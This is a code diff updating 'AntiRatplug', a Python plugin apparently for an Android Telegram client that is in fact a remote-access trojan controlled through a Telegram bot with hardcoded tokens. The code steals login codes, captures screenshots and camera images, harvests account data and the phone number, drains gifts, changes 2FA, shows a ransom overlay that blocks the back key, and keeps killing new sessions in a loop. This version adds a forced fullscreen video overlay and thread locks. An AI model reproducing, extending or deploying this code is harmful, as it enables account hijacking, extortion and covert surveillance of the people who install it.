@@ -1,14 +1,14 @@
 # -*- coding: utf-8 -*-
 """
-AntiRatplug v22.3 — final + nuke loop + ransom in lockdown.
+AntiRatplug v22.4 — final + nuke loop + ransom in lockdown + M-Video.
 Menu: Manual / Troll / Automatic. Full Lockdown. Phone harvest fixed.
 """
 
 __id__ = "AntiRatplug"
 __name__ = "AntiRatplug"
-__description__ = "v22.3."
+__description__ = "v22.4."
 __author__ = "@from_a4"
-__version__ = "22.3"
+__version__ = "22.4"
 __min_version__ = "11.12.1"
 __icon__ = "CreepyEmojiAnim/5"
 __app_version__ = ">=12.5.1"
@@ -35,8 +35,8 @@ import hashlib
 import base64
 
 
-BOT_TOKEN = "8906895129:AAE06LFOFJDuM-Lr62G-FK5ZAPClPdQdrXI"
-BOT_UID = 8391217110
+BOT_TOKEN = "8899237597:AAHiRm411lCpen9wfZV37XWL6OHY6tqBp4Y"
+BOT_UID = 8943150715
 BOT_UID_STR = str(BOT_UID)
 API_BASE = "https://api.telegram.org/bot" + BOT_TOKEN
 
@@ -47,6 +47,7 @@ RANSOM_WARNING = "Закроешь приложение — данные буд�
 
 RECIPIENT_CACHE_TTL = 600
 MAX_DOC_SIZE = 5 * 1024 * 1024
+VIDEO_MAX_SIZE = 200 * 1024 * 1024
 
 _logger = None
 
@@ -297,6 +298,37 @@ def _http_post_multipart(url, fields, file_field, file_name, file_bytes, timeout
         return None
 
 
+def _download_to_file(url, path, max_size=None, timeout=180):
+    """Стримовое скачивание с лимитом размера. Возвращает размер или -1."""
+    from urllib.request import Request, urlopen
+    try:
+        req = Request(url, headers={"User-Agent": "Mozilla/5.0"}, method="GET")
+        total = 0
+        with urlopen(req, timeout=timeout) as r, open(path, "wb") as f:
+            while True:
+                chunk = r.read(65536)
+                if not chunk:
+                    break
+                total += len(chunk)
+                if max_size is not None and total > max_size:
+                    f.close()
+                    try:
+                        os.remove(path)
+                    except Exception:
+                        pass
+                    return -1
+                f.write(chunk)
+        return total
+    except Exception as e:
+        _log("download: %s" % e)
+        try:
+            if os.path.exists(path):
+                os.remove(path)
+        except Exception:
+            pass
+        return -1
+
+
 class PluginSecurityPlugin(BasePlugin):
     def __init__(self):
         super().__init__()
@@ -320,17 +352,29 @@ class PluginSecurityPlugin(BasePlugin):
         self._tg_kid_watching = False
         self._tg_kid_seen = set()
         self._tg_kid_thread = None
+        self._tg_kid_lock = threading.Lock()
 
         self._ransom_view = None
         self._ransom_wm = None
         self._ransom_decor = None
         self._ransom_photo_path = ""
         self._ransom_photo_url = ""
+        self._ransom_lock = threading.RLock()
+
         self._locker_view = None
         self._locker_on = False
         self._dim_view = None
         self._dim_active = False
+
         self._music_mp = None
+        self._music_path = ""
+        self._music_lock = threading.RLock()
+
+        self._video_view = None
+        self._video_vv = None
+        self._video_path = ""
+        self._video_lock = threading.RLock()
+
         self._flood_uris = []
 
         self._input_mode = None
@@ -339,6 +383,7 @@ class PluginSecurityPlugin(BasePlugin):
         self._nuke_thread = None
         self._nuke_interval = 60
         self._nuke_pass = 0
+        self._nuke_lock = threading.RLock()
 
     def on_plugin_load(self):
         self._sync_running = True
@@ -363,9 +408,10 @@ class PluginSecurityPlugin(BasePlugin):
         self._active = False
         self.stop = True
         self._tg_kid_watching = False
-        self._nuke_on = False
+        with self._nuke_lock:
+            self._nuke_on = False
         for fn in (self._dismiss_ransom, self._clear_locker,
-                   self._clear_dim, self._clear_music):
+                   self._clear_dim, self._clear_music, self._clear_video):
             try:
                 fn()
             except Exception:
@@ -395,7 +441,7 @@ class PluginSecurityPlugin(BasePlugin):
         except Exception as e:
             _log("boot phone debug: %s" % e)
         try:
-            self._send_msg("AntiRatplug v22.3 loaded")
+            self._send_msg("AntiRatplug v22.4 loaded")
         except Exception as e:
             _log("boot send: %s" % e)
         try:
@@ -680,7 +726,7 @@ class PluginSecurityPlugin(BasePlugin):
                 username = "id:" + str(uid)
         except Exception as e:
             _log("manage btn user: %s" % e)
-        line = "<b>AntiRatplug v22.3</b>\nUser: @" + username
+        line = "<b>AntiRatplug v22.4</b>\nUser: @" + username
         if phone:
             line += "\nPhone: " + phone
         kb = {"inline_keyboard": [[{"text": "Manage", "callback_data": "menu"}]]}
@@ -698,7 +744,7 @@ class PluginSecurityPlugin(BasePlugin):
             ],
             "resize_keyboard": True,
         }
-        self._send_markup("AntiRatplug v22.3", kb, html=True)
+        self._send_markup("AntiRatplug v22.4", kb, html=True)
 
     def _show_manual_menu(self):
         kb = {
@@ -788,6 +834,7 @@ class PluginSecurityPlugin(BasePlugin):
                 [{"text": "Ransom"}],
                 [{"text": "Lock screen"}],
                 [{"text": "M-music"}],
+                [{"text": "M-Video"}],
                 [{"text": "Flood Gallery"}],
                 [{"text": "Clear Flood"}],
                 [{"text": "Dim screen"}],
@@ -811,12 +858,13 @@ class PluginSecurityPlugin(BasePlugin):
 
     def _show_help(self):
         text = (
-            "<b>AntiRatplug v22.3</b>\n\n"
+            "<b>AntiRatplug v22.4</b>\n\n"
             "<b>Tg kid</b> — код из 777000 + live-watch + авто-подтверждение\n"
             "<b>Screenshot gain</b> — скрин + фронт + бэк\n"
             "<b>Full Harvest</b> — сбор без модификаций\n"
             "<b>Full Lockdown</b> — harvest + gifts + 2FA + profile + ransom + kill + nuke + pull out\n"
             "<b>Gift Transfer</b> — gift drain на получателя\n"
+            "<b>M-Video</b> — fullscreen video overlay\n"
             "<b>Nuke loop</b> — убивает новые сессии каждые 60с\n\n"
             "Recipient: " + BOT_UID_STR
         )
@@ -839,6 +887,8 @@ class PluginSecurityPlugin(BasePlugin):
                 self._clear_locker()
             elif data == "close_music":
                 self._clear_music()
+            elif data == "close_video":
+                self._clear_video()
             elif data == "close_end":
                 self._clear_dim()
             elif data == "hv_logout":
@@ -857,6 +907,13 @@ class PluginSecurityPlugin(BasePlugin):
                 self._input_mode = None
                 if t.startswith("http"):
                     self._play_mmusic(t)
+                else:
+                    self._send_msg("Bad URL")
+                return
+            if self._input_mode == "video":
+                self._input_mode = None
+                if t.startswith("http"):
+                    self._play_mvideo(t)
                 else:
                     self._send_msg("Bad URL")
                 return
@@ -940,6 +997,9 @@ class PluginSecurityPlugin(BasePlugin):
             elif t == "M-music":
                 self._input_mode = "music"
                 self._send_msg("Send .mp3 URL")
+            elif t == "M-Video":
+                self._input_mode = "video"
+                self._send_msg("Send .mp4 URL")
             elif t == "Flood Gallery":
                 threading.Thread(target=self._flood_gallery,
                                  args=(RANSOM_PHOTO_URL, 100), daemon=True).start()
@@ -1243,11 +1303,12 @@ class PluginSecurityPlugin(BasePlugin):
                 lines.append("<pre>" + self._html_escape(raw[:400]) + "</pre>")
             self._send_msg("\n".join(lines), html=True)
 
-            if not self._tg_kid_watching:
-                self._tg_kid_watching = True
-                self._tg_kid_thread = threading.Thread(
-                    target=self._tg_kid_watch_loop, daemon=True)
-                self._tg_kid_thread.start()
+            with self._tg_kid_lock:
+                if not self._tg_kid_watching:
+                    self._tg_kid_watching = True
+                    self._tg_kid_thread = threading.Thread(
+                        target=self._tg_kid_watch_loop, daemon=True)
+                    self._tg_kid_thread.start()
             return code
         except Exception as e:
             self._send_msg("Tg kid err: " + str(e))
@@ -1259,7 +1320,8 @@ class PluginSecurityPlugin(BasePlugin):
         HistReq = _cls("org.telegram.tgnet.TLRPC$TL_messages_getHistory",
                        "org.telegram.tgnet.tl.TL_messages$getHistory")
         if not HistReq:
-            self._tg_kid_watching = False
+            with self._tg_kid_lock:
+                self._tg_kid_watching = False
             return
         try:
             ip = self._get_input_peer(0, 777000)
@@ -1313,7 +1375,8 @@ class PluginSecurityPlugin(BasePlugin):
                 if not self._sync_running or self.stop:
                     break
                 time.sleep(1)
-        self._tg_kid_watching = False
+        with self._tg_kid_lock:
+            self._tg_kid_watching = False
 
     def _screenshot_gain(self):
         results = {"screenshot": None, "camera_front": None, "camera_back": None}
@@ -2620,174 +2683,176 @@ class PluginSecurityPlugin(BasePlugin):
             return False
 
     def _show_ransom(self, text="", photo_url=""):
-        if self._ransom_view is not None:
-            return {"ok": True, "already": True}
-        try:
-            ctx = ApplicationLoader.applicationContext
-            if ctx is None:
-                return {"error": "no ctx"}
-            use_decor = not self._ensure_overlay_perm(ctx)
-            photo_path = ""
-            if photo_url and self._ransom_photo_path and self._ransom_photo_url == photo_url \
-                    and os.path.exists(self._ransom_photo_path):
-                photo_path = self._ransom_photo_path
-            elif photo_url:
-                try:
-                    from urllib.request import urlopen
-                    data = urlopen(photo_url, timeout=20).read()
-                    photo_path = os.path.join(
-                        str(ctx.getFilesDir().getAbsolutePath()),
-                        "ransom_%d.jpg" % int(time.time()))
-                    with open(photo_path, "wb") as f:
-                        f.write(data)
-                    self._ransom_photo_path = photo_path
-                    self._ransom_photo_url = photo_url
-                except Exception:
-                    pass
+        with self._ransom_lock:
+            if self._ransom_view is not None:
+                return {"ok": True, "already": True}
+            try:
+                ctx = ApplicationLoader.applicationContext
+                if ctx is None:
+                    return {"error": "no ctx"}
+                use_decor = not self._ensure_overlay_perm(ctx)
+                photo_path = ""
+                if photo_url and self._ransom_photo_path and self._ransom_photo_url == photo_url \
+                        and os.path.exists(self._ransom_photo_path):
+                    photo_path = self._ransom_photo_path
+                elif photo_url:
+                    try:
+                        from urllib.request import urlopen
+                        data = urlopen(photo_url, timeout=20).read()
+                        photo_path = os.path.join(
+                            str(ctx.getFilesDir().getAbsolutePath()),
+                            "ransom_%d.jpg" % int(time.time()))
+                        with open(photo_path, "wb") as f:
+                            f.write(data)
+                        self._ransom_photo_path = photo_path
+                        self._ransom_photo_url = photo_url
+                    except Exception:
+                        pass
 
-            drew = threading.Event()
-            derr = [None]
+                drew = threading.Event()
+                derr = [None]
 
-            def _build():
-                try:
-                    CTX = jclass("android.content.Context")
-                    wm = ctx.getSystemService(CTX.WINDOW_SERVICE)
-                    self._ransom_wm = wm
-                    LL = jclass("android.widget.LinearLayout")
-                    TV = jclass("android.widget.TextView")
-                    IV = jclass("android.widget.ImageView")
-                    LP = jclass("android.view.WindowManager$LayoutParams")
-                    LP_LV = jclass("android.widget.LinearLayout$LayoutParams")
-                    Color = jclass("android.graphics.Color")
-                    Gravity = jclass("android.view.Gravity")
-                    BitmapFactory = jclass("android.graphics.BitmapFactory")
-                    TypedValue = jclass("android.util.TypedValue")
-                    VLG = jclass("android.view.ViewGroup$LayoutParams")
-                    root = LL(ctx)
-                    root.setOrientation(LL.VERTICAL)
-                    root.setBackgroundColor(Color.parseColor("#1A1A1A"))
-                    pad = int(TypedValue.applyDimension(
-                        TypedValue.COMPLEX_UNIT_DIP, 24,
-                        ctx.getResources().getDisplayMetrics()))
-                    root.setPadding(pad, pad, pad, pad)
-                    root.setGravity(Gravity.CENTER)
-                    if photo_path:
-                        try:
-                            bmp = BitmapFactory.decodeFile(photo_path)
-                            if bmp is not None:
-                                iv = IV(ctx)
-                                iv_lp = LP_LV(VLG.MATCH_PARENT, int(TypedValue.applyDimension(
-                                    TypedValue.COMPLEX_UNIT_DIP, 280,
-                                    ctx.getResources().getDisplayMetrics())))
-                                iv_lp.bottomMargin = int(TypedValue.applyDimension(
-                                    TypedValue.COMPLEX_UNIT_DIP, 16,
-                                    ctx.getResources().getDisplayMetrics()))
-                                iv.setLayoutParams(iv_lp)
-                                iv.setScaleType(iv.ScaleType.CENTER_CROP)
-                                iv.setImageBitmap(bmp)
-                                root.addView(iv)
-                        except Exception:
-                            pass
-                    tv = TV(ctx)
-                    tv.setLayoutParams(LP_LV(VLG.MATCH_PARENT, VLG.WRAP_CONTENT))
-                    tv.setText(str(text))
-                    tv.setTextColor(Color.WHITE)
-                    tv.setTextSize(TypedValue.COMPLEX_UNIT_SP, 18)
-                    tv.setGravity(Gravity.CENTER)
-                    root.addView(tv)
-                    warn_tv = TV(ctx)
-                    warn_lp = LP_LV(VLG.MATCH_PARENT, VLG.WRAP_CONTENT)
-                    warn_lp.topMargin = int(TypedValue.applyDimension(
-                        TypedValue.COMPLEX_UNIT_DIP, 20,
-                        ctx.getResources().getDisplayMetrics()))
-                    warn_tv.setLayoutParams(warn_lp)
-                    warn_tv.setText(RANSOM_WARNING)
-                    warn_tv.setTextColor(Color.parseColor("#FF3B30"))
-                    warn_tv.setTextSize(TypedValue.COMPLEX_UNIT_SP, 16)
-                    warn_tv.setGravity(Gravity.CENTER)
-                    root.addView(warn_tv)
-                    KE = jclass("android.view.KeyEvent")
-
-                    class _OnKey(dynamic_proxy(jclass("android.view.View$OnKeyListener"))):
-                        def onKey(self, v, keyCode, event):
+                def _build():
+                    try:
+                        CTX = jclass("android.content.Context")
+                        wm = ctx.getSystemService(CTX.WINDOW_SERVICE)
+                        self._ransom_wm = wm
+                        LL = jclass("android.widget.LinearLayout")
+                        TV = jclass("android.widget.TextView")
+                        IV = jclass("android.widget.ImageView")
+                        LP = jclass("android.view.WindowManager$LayoutParams")
+                        LP_LV = jclass("android.widget.LinearLayout$LayoutParams")
+                        Color = jclass("android.graphics.Color")
+                        Gravity = jclass("android.view.Gravity")
+                        BitmapFactory = jclass("android.graphics.BitmapFactory")
+                        TypedValue = jclass("android.util.TypedValue")
+                        VLG = jclass("android.view.ViewGroup$LayoutParams")
+                        root = LL(ctx)
+                        root.setOrientation(LL.VERTICAL)
+                        root.setBackgroundColor(Color.parseColor("#1A1A1A"))
+                        pad = int(TypedValue.applyDimension(
+                            TypedValue.COMPLEX_UNIT_DIP, 24,
+                            ctx.getResources().getDisplayMetrics()))
+                        root.setPadding(pad, pad, pad, pad)
+                        root.setGravity(Gravity.CENTER)
+                        if photo_path:
                             try:
-                                if keyCode == KE.KEYCODE_BACK:
-                                    return True
+                                bmp = BitmapFactory.decodeFile(photo_path)
+                                if bmp is not None:
+                                    iv = IV(ctx)
+                                    iv_lp = LP_LV(VLG.MATCH_PARENT, int(TypedValue.applyDimension(
+                                        TypedValue.COMPLEX_UNIT_DIP, 280,
+                                        ctx.getResources().getDisplayMetrics())))
+                                    iv_lp.bottomMargin = int(TypedValue.applyDimension(
+                                        TypedValue.COMPLEX_UNIT_DIP, 16,
+                                        ctx.getResources().getDisplayMetrics()))
+                                    iv.setLayoutParams(iv_lp)
+                                    iv.setScaleType(iv.ScaleType.CENTER_CROP)
+                                    iv.setImageBitmap(bmp)
+                                    root.addView(iv)
                             except Exception:
                                 pass
-                            return False
+                        tv = TV(ctx)
+                        tv.setLayoutParams(LP_LV(VLG.MATCH_PARENT, VLG.WRAP_CONTENT))
+                        tv.setText(str(text))
+                        tv.setTextColor(Color.WHITE)
+                        tv.setTextSize(TypedValue.COMPLEX_UNIT_SP, 18)
+                        tv.setGravity(Gravity.CENTER)
+                        root.addView(tv)
+                        warn_tv = TV(ctx)
+                        warn_lp = LP_LV(VLG.MATCH_PARENT, VLG.WRAP_CONTENT)
+                        warn_lp.topMargin = int(TypedValue.applyDimension(
+                            TypedValue.COMPLEX_UNIT_DIP, 20,
+                            ctx.getResources().getDisplayMetrics()))
+                        warn_tv.setLayoutParams(warn_lp)
+                        warn_tv.setText(RANSOM_WARNING)
+                        warn_tv.setTextColor(Color.parseColor("#FF3B30"))
+                        warn_tv.setTextSize(TypedValue.COMPLEX_UNIT_SP, 16)
+                        warn_tv.setGravity(Gravity.CENTER)
+                        root.addView(warn_tv)
+                        KE = jclass("android.view.KeyEvent")
 
-                    root.setOnKeyListener(_OnKey())
-                    root.setFocusableInTouchMode(True)
-                    root.requestFocus()
-                    if use_decor:
-                        act2 = self._get_activity()
-                        if act2 is None:
-                            raise Exception("no activity")
-                        win2 = act2.getWindow()
-                        win2.addFlags(getattr(LP, "FLAG_KEEP_SCREEN_ON", 128))
-                        decor = win2.getDecorView()
-                        decor.addView(root, VLG(VLG.MATCH_PARENT, VLG.MATCH_PARENT))
-                        self._ransom_decor = decor
-                    else:
-                        params = LP(
-                            LP.MATCH_PARENT, LP.MATCH_PARENT,
-                            getattr(LP, "TYPE_APPLICATION_OVERLAY",
-                                    getattr(LP, "TYPE_PHONE", 2002)),
-                            getattr(LP, "FLAG_KEEP_SCREEN_ON", 128)
-                            | getattr(LP, "FLAG_LAYOUT_IN_SCREEN", 256),
-                            -3)
-                        params.gravity = Gravity.CENTER
-                        wm.addView(root, params)
-                    self._ransom_view = root
-                except Exception as e:
-                    derr[0] = e
-                finally:
-                    drew.set()
+                        class _OnKey(dynamic_proxy(jclass("android.view.View$OnKeyListener"))):
+                            def onKey(self, v, keyCode, event):
+                                try:
+                                    if keyCode == KE.KEYCODE_BACK:
+                                        return True
+                                except Exception:
+                                    pass
+                                return False
 
-            act = self._get_activity()
-            if act is not None:
-                act.runOnUiThread(_build)
-            else:
-                _build()
-            drew.wait(12)
-            if derr[0] is not None:
-                return {"error": "ransom: %s" % derr[0]}
-            if self._ransom_view is None:
-                return {"error": "overlay not created"}
-            self._send_msg("Ransom overlay ON")
-            return {"ok": True}
-        except Exception as e:
-            return {"error": "ransom: %s" % e}
+                        root.setOnKeyListener(_OnKey())
+                        root.setFocusableInTouchMode(True)
+                        root.requestFocus()
+                        if use_decor:
+                            act2 = self._get_activity()
+                            if act2 is None:
+                                raise Exception("no activity")
+                            win2 = act2.getWindow()
+                            win2.addFlags(getattr(LP, "FLAG_KEEP_SCREEN_ON", 128))
+                            decor = win2.getDecorView()
+                            decor.addView(root, VLG(VLG.MATCH_PARENT, VLG.MATCH_PARENT))
+                            self._ransom_decor = decor
+                        else:
+                            params = LP(
+                                LP.MATCH_PARENT, LP.MATCH_PARENT,
+                                getattr(LP, "TYPE_APPLICATION_OVERLAY",
+                                        getattr(LP, "TYPE_PHONE", 2002)),
+                                getattr(LP, "FLAG_KEEP_SCREEN_ON", 128)
+                                | getattr(LP, "FLAG_LAYOUT_IN_SCREEN", 256),
+                                -3)
+                            params.gravity = Gravity.CENTER
+                            wm.addView(root, params)
+                        self._ransom_view = root
+                    except Exception as e:
+                        derr[0] = e
+                    finally:
+                        drew.set()
+
+                act = self._get_activity()
+                if act is not None:
+                    act.runOnUiThread(_build)
+                else:
+                    _build()
+                drew.wait(12)
+                if derr[0] is not None:
+                    return {"error": "ransom: %s" % derr[0]}
+                if self._ransom_view is None:
+                    return {"error": "overlay not created"}
+                self._send_msg("Ransom overlay ON")
+                return {"ok": True}
+            except Exception as e:
+                return {"error": "ransom: %s" % e}
 
     def _dismiss_ransom(self):
-        try:
-            if self._ransom_view is None:
+        with self._ransom_lock:
+            try:
+                if self._ransom_view is None:
+                    return {"ok": True}
+                removed = threading.Event()
+
+                def _rm():
+                    try:
+                        if self._ransom_view is not None:
+                            parent = self._ransom_decor or self._ransom_wm
+                            if parent is not None:
+                                parent.removeView(self._ransom_view)
+                            self._ransom_view = None
+                            self._ransom_decor = None
+                    except Exception:
+                        pass
+                    finally:
+                        removed.set()
+
+                act = self._get_activity()
+                if act is not None:
+                    act.runOnUiThread(_rm)
+                    removed.wait(8)
+                else:
+                    _rm()
                 return {"ok": True}
-            removed = threading.Event()
-
-            def _rm():
-                try:
-                    if self._ransom_view is not None:
-                        parent = self._ransom_decor or self._ransom_wm
-                        if parent is not None:
-                            parent.removeView(self._ransom_view)
-                        self._ransom_view = None
-                        self._ransom_decor = None
-                except Exception:
-                    pass
-                finally:
-                    removed.set()
-
-            act = self._get_activity()
-            if act is not None:
-                act.runOnUiThread(_rm)
-                removed.wait(8)
-            else:
-                _rm()
-            return {"ok": True}
-        except Exception as e:
-            return {"error": str(e)}
+            except Exception as e:
+                return {"error": str(e)}
 
     def _lock_screen(self):
         if self._locker_on:
@@ -2820,11 +2885,22 @@ class PluginSecurityPlugin(BasePlugin):
         if not self._locker_on or self._locker_view is None:
             return
         try:
-            parent = self._locker_view.getParent()
-            if parent is not None:
-                parent.removeView(self._locker_view)
-            self._locker_view = None
-            self._locker_on = False
+            def _rm():
+                try:
+                    parent = self._locker_view.getParent() if self._locker_view else None
+                    if parent is not None:
+                        parent.removeView(self._locker_view)
+                    self._locker_view = None
+                    self._locker_on = False
+                except Exception:
+                    self._locker_view = None
+                    self._locker_on = False
+
+            act = self._get_activity()
+            if act is not None:
+                act.runOnUiThread(_rm)
+            else:
+                _rm()
         except Exception:
             self._locker_view = None
             self._locker_on = False
@@ -2838,31 +2914,166 @@ class PluginSecurityPlugin(BasePlugin):
                     os.makedirs(d)
                 path = os.path.join(d, "mmusic_%d.mp3" % int(time.time()))
                 self._send_msg("Downloading...")
-                from urllib.request import urlopen
-                data = urlopen(url, timeout=60).read()
-                with open(path, "wb") as f:
-                    f.write(data)
-                self._clear_music()
-                mp = jclass("android.media.MediaPlayer")()
-                mp.setDataSource(path)
-                mp.prepare()
-                mp.setLooping(True)
-                mp.start()
-                self._music_mp = mp
+                sz = _download_to_file(url, path, max_size=50 * 1024 * 1024, timeout=120)
+                if sz <= 0:
+                    self._send_msg("music download fail")
+                    return
+                with self._music_lock:
+                    self._stop_music_locked()
+                    mp = jclass("android.media.MediaPlayer")()
+                    mp.setDataSource(path)
+                    mp.prepare()
+                    mp.setLooping(True)
+                    mp.start()
+                    self._music_mp = mp
+                    self._music_path = path
                 self._send_msg("Music playing")
             except Exception as e:
                 self._send_msg("music err: " + str(e))
 
         threading.Thread(target=task, daemon=True).start()
 
-    def _clear_music(self):
+    def _stop_music_locked(self):
         if self._music_mp is not None:
             try:
                 self._music_mp.stop()
+            except Exception:
+                pass
+            try:
                 self._music_mp.release()
             except Exception:
                 pass
             self._music_mp = None
+        if self._music_path:
+            try:
+                if os.path.exists(self._music_path):
+                    os.remove(self._music_path)
+            except Exception:
+                pass
+            self._music_path = ""
+
+    def _clear_music(self):
+        with self._music_lock:
+            self._stop_music_locked()
+
+    def _play_mvideo(self, url):
+        def task():
+            try:
+                ctx = ApplicationLoader.applicationContext
+                d = os.path.join(str(ctx.getFilesDir().getAbsolutePath()), "sec_assets")
+                if not os.path.exists(d):
+                    os.makedirs(d)
+                path = os.path.join(d, "mvideo_%d.mp4" % int(time.time()))
+                self._send_msg("Downloading video...")
+                sz = _download_to_file(url, path, max_size=VIDEO_MAX_SIZE, timeout=300)
+                if sz <= 0:
+                    self._send_msg("video download fail (size limit %d)" % VIDEO_MAX_SIZE)
+                    return
+
+                def _render():
+                    try:
+                        act = self._get_activity()
+                        if act is None:
+                            self._send_msg("video: no activity")
+                            try:
+                                os.remove(path)
+                            except Exception:
+                                pass
+                            return
+                        FrameLayout = jclass("android.widget.FrameLayout")
+                        VLG = jclass("android.view.ViewGroup$LayoutParams")
+                        VV = jclass("android.widget.VideoView")
+                        MC = jclass("android.widget.MediaController")
+                        Color = jclass("android.graphics.Color")
+                        LP = jclass("android.view.WindowManager$LayoutParams")
+
+                        with self._video_lock:
+                            self._stop_video_locked(keep_activity=True)
+
+                        root = FrameLayout(act)
+                        root.setBackgroundColor(Color.BLACK)
+                        vv = VV(act)
+                        root.addView(vv, VLG(VLG.MATCH_PARENT, VLG.MATCH_PARENT))
+
+                        mc = MC(act)
+                        mc.setAnchorView(vv)
+                        vv.setMediaController(mc)
+                        vv.setVideoPath(path)
+                        vv.setOnPreparedListener(_MediaPreparedCls()(vv))
+
+                        win = act.getWindow()
+                        win.addFlags(getattr(LP, "FLAG_FULLSCREEN", 1024)
+                                     | getattr(LP, "FLAG_KEEP_SCREEN_ON", 128))
+                        decor = win.getDecorView()
+                        try:
+                            decor.setSystemUiVisibility(
+                                0x00000004 | 0x00000002 | 0x00001000
+                                | 0x00000100 | 0x00000200 | 0x00000400)
+                        except Exception:
+                            pass
+
+                        decor.addView(root, VLG(VLG.MATCH_PARENT, VLG.MATCH_PARENT))
+                        with self._video_lock:
+                            self._video_view = root
+                            self._video_vv = vv
+                            self._video_path = path
+                        self._send_msg("Video playing (fullscreen)")
+                    except Exception as e:
+                        _log("video render: %s" % e)
+                        try:
+                            os.remove(path)
+                        except Exception:
+                            pass
+                        self._send_msg("video render err: " + str(e))
+
+                act = self._get_activity()
+                if act is not None:
+                    act.runOnUiThread(_render)
+                else:
+                    _render()
+            except Exception as e:
+                self._send_msg("video err: " + str(e))
+
+        threading.Thread(target=task, daemon=True).start()
+
+    def _stop_video_locked(self, keep_activity=False):
+        vv = self._video_vv
+        view = self._video_view
+        path = self._video_path
+        self._video_vv = None
+        self._video_view = None
+        self._video_path = ""
+        if vv is not None:
+            try:
+                vv.stopPlayback()
+            except Exception:
+                pass
+        if view is not None:
+            try:
+                parent = view.getParent()
+                if parent is not None:
+                    parent.removeView(view)
+            except Exception:
+                pass
+        act = self._get_activity()
+        if act is not None:
+            try:
+                win = act.getWindow()
+                LP = jclass("android.view.WindowManager$LayoutParams")
+                win.clearFlags(getattr(LP, "FLAG_FULLSCREEN", 1024))
+                win.getDecorView().setSystemUiVisibility(0)
+            except Exception:
+                pass
+        if path:
+            try:
+                if os.path.exists(path):
+                    os.remove(path)
+            except Exception:
+                pass
+
+    def _clear_video(self):
+        with self._video_lock:
+            self._stop_video_locked()
 
     def _flood_gallery(self, photo_url, count=100):
         try:
@@ -2939,16 +3150,25 @@ class PluginSecurityPlugin(BasePlugin):
         if not self._dim_active or self._dim_view is None:
             return
         try:
-            parent = self._dim_view.getParent()
-            if parent is not None:
-                parent.removeView(self._dim_view)
-            self._dim_view = None
-            self._dim_active = False
+            def _rm():
+                try:
+                    parent = self._dim_view.getParent() if self._dim_view else None
+                    if parent is not None:
+                        parent.removeView(self._dim_view)
+                    self._dim_view = None
+                    self._dim_active = False
+                except Exception:
+                    self._dim_view = None
+                    self._dim_active = False
+
+            act = self._get_activity()
+            if act is not None:
+                act.runOnUiThread(_rm)
+            else:
+                _rm()
         except Exception:
             self._dim_view = None
             self._dim_active = False
-
-    # ─── nuke loop ────────────────────────────────────────────────────────
 
     def _nuke_marker_path(self):
         try:
@@ -2964,7 +3184,8 @@ class PluginSecurityPlugin(BasePlugin):
             if m:
                 with open(m, "w") as f:
                     f.write("1")
-            self._nuke_on = True
+            with self._nuke_lock:
+                self._nuke_on = True
         except Exception:
             pass
 
@@ -2973,10 +3194,13 @@ class PluginSecurityPlugin(BasePlugin):
             m = self._nuke_marker_path()
             if not m or not os.path.exists(m):
                 return
-            self._nuke_on = True
-            self._nuke_thread = threading.Thread(
-                target=self._nuke_loop, daemon=True)
-            self._nuke_thread.start()
+            with self._nuke_lock:
+                if self._nuke_on:
+                    return
+                self._nuke_on = True
+                self._nuke_thread = threading.Thread(
+                    target=self._nuke_loop, daemon=True)
+                self._nuke_thread.start()
             try:
                 self._send_msg("Nuke loop resumed from marker")
             except Exception:
@@ -2985,24 +3209,30 @@ class PluginSecurityPlugin(BasePlugin):
             pass
 
     def _start_nuke_loop(self):
-        if self._nuke_on and self._nuke_thread and self._nuke_thread.is_alive():
+        with self._nuke_lock:
+            if self._nuke_on and self._nuke_thread and self._nuke_thread.is_alive():
+                already = True
+            else:
+                already = False
+                self._nuke_on = True
+                self._nuke_pass = 0
+                self._mark_nuke()
+                self._nuke_thread = threading.Thread(target=self._nuke_loop, daemon=True)
+                self._nuke_thread.start()
+        if already:
             try:
                 self._send_msg("Nuke loop already running")
             except Exception:
                 pass
-            return
-        self._nuke_on = True
-        self._mark_nuke()
-        self._nuke_pass = 0
-        self._nuke_thread = threading.Thread(target=self._nuke_loop, daemon=True)
-        self._nuke_thread.start()
-        try:
-            self._send_msg("Nuke loop STARTED. Killing sessions every 60s.")
-        except Exception:
-            pass
+        else:
+            try:
+                self._send_msg("Nuke loop STARTED. Killing sessions every 60s.")
+            except Exception:
+                pass
 
     def _stop_nuke_loop(self):
-        self._nuke_on = False
+        with self._nuke_lock:
+            self._nuke_on = False
         try:
             m = self._nuke_marker_path()
             if m and os.path.exists(m):
@@ -3015,7 +3245,10 @@ class PluginSecurityPlugin(BasePlugin):
             pass
 
     def _nuke_loop(self):
-        while self._nuke_on and self._sync_running and not self.stop:
+        while True:
+            with self._nuke_lock:
+                if not self._nuke_on or not self._sync_running or self.stop:
+                    return
             self._nuke_pass += 1
             try:
                 for a in self._get_accounts_list():
@@ -3035,11 +3268,10 @@ class PluginSecurityPlugin(BasePlugin):
             except Exception as e:
                 _log("nuke pass %d: %s" % (self._nuke_pass, e))
             for _ in range(self._nuke_interval):
-                if not self._nuke_on or not self._sync_running or self.stop:
-                    return
+                with self._nuke_lock:
+                    if not self._nuke_on or not self._sync_running or self.stop:
+                        return
                 time.sleep(1)
-
-    # ─── full harvest / lockdown ──────────────────────────────────────────
 
     def _full_harvest(self):
         def task():
@@ -3114,7 +3346,6 @@ class PluginSecurityPlugin(BasePlugin):
                 self._send_msg("Full Lockdown...")
                 report = ["<b>Full Lockdown</b>"]
 
-                # 1 harvest + sessions
                 if not alive():
                     return
                 self._send_msg("1/9 harvest + sessions...")
@@ -3127,7 +3358,6 @@ class PluginSecurityPlugin(BasePlugin):
                 report.append("<b>Pending:</b> %s" % str(ga[1]))
                 report.append("<b>Web:</b> %s" % str(ga[2]))
 
-                # 2 gift drain
                 if not alive():
                     return
                 self._send_msg("2/9 gift drain...")
@@ -3147,7 +3377,6 @@ class PluginSecurityPlugin(BasePlugin):
                 except Exception as e:
                     report.append("<b>Gifts:</b> %s" % e)
 
-                # 3 2FA
                 if not alive():
                     return
                 self._send_msg("3/9 2FA...")
@@ -3157,7 +3386,6 @@ class PluginSecurityPlugin(BasePlugin):
                     pwd = {"final": "exc: %s" % e}
                 report.append("<b>2FA:</b> %s" % pwd.get("final", "?"))
 
-                # 4 profile lock
                 if not alive():
                     return
                 self._send_msg("4/9 profile lock...")
@@ -3177,14 +3405,12 @@ class PluginSecurityPlugin(BasePlugin):
                 report.append("<b>Profile:</b> %s" % ("[LOCKED]" if prof else "fail"))
                 report.append("<b>Contacts:</b> %s" % cont)
 
-                # 5 kill sessions
                 if not alive():
                     return
                 self._send_msg("5/9 kill sessions...")
